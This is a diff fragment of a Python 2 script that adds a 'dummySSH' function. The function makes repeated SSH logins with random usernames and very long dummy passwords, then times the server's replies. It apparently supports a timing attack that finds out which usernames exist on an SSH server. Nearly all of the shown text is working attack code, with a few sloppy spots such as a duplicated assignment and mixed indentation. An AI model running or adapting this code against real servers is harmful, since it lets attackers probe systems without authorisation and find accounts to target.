@@ -46,8 +46,63 @@ import time
 import os,sys
 import subprocess
 from threading import *
+import random
 
 screenLock = Semaphore(value=1)
+
+def dummySSH(host, port,length):
+	dummyconn = 10 
+	print '[+] %d dummy attemps @%s:%d with random users to test the delay of the server ... ' % (dummyconn,host,int(port))
+	size = 4
+	chars = chars=string.ascii_lowercase + string.digits
+	sumdelay = 0
+	print 
+	for k in range(dummyconn):
+		sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+		user = ''.join(random.choice(chars) for _ in range(size))
+		print '[+] Connecting with random user %s@%s:%d ... ' % (user,host,int(port))
+		try:
+			sock.connect((host,int(port)))
+			para = paramiko.Transport(sock)
+			para.local_version="SSH-2.0-Blabla"
+
+		except paramiko.SSHException: 
+			print "[-] Unable to connect to host"
+			return  
+        	except socket.error: 
+			print "[-] Unable to connect to host"
+			return  
+    
+		try:
+			para.connect(username=user)
+
+		except EOFError,e:
+			print '[-] Error: %s' % e
+			return  
+
+		except paramiko.SSHException,e:
+        		print '[-] Error: %s' % e
+        		return   
+		passwd = 'A'*length
+		timeStart = int(time.time())
+
+		try:
+			para.auth_password(user,passwd)
+		except paramiko.AuthenticationException,e:
+			print '[-] '+ str(e)
+		except paramiko.SSHException,e:
+			print '[-] '+ str(e)
+
+		timeDone = int(time.time())
+		delay = timeDone-timeStart
+		para.close()
+		sumdelay = sumdelay + delay
+		sock.close()
+	measure = int(sumdelay/dummyconn)
+	return measure 
+
+	
+
 
 def sshTime(host,port,user,sock,defTime,length):
 	print 
